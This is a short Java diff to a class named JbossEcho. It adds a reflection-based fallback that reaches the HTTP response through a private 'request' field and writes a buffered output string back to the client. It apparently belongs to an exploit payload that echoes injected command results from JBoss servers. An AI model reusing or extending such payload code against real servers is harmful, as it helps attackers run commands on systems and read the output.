@@ -25,7 +25,13 @@ public class JbossEcho {
 					os.close();
 				} catch (ClassNotFoundException ignored) {
 					Object response = getMethodAndInvoke(req, "getResponse", new Class[]{}, new Object[]{});
-					Object writer   = getMethodAndInvoke(response, "getWriter", new Class[]{}, new Object[]{});
+					if (response == null) {
+						java.lang.reflect.Field field = req.getClass().getDeclaredField("request");
+						field.setAccessible(true);
+						response = getMethodAndInvoke(field.get(req), "getResponse", new Class[]{}, new Object[]{});
+
+					}
+					Object writer = getMethodAndInvoke(response, "getWriter", new Class[]{}, new Object[]{});
 					getMethodAndInvoke(writer, "write", new Class[]{String.class}, new Object[]{baos.toString()});
 					getMethodAndInvoke(writer, "flush", new Class[]{}, new Object[]{});
 					getMethodAndInvoke(writer, "close", new Class[]{}, new Object[]{});
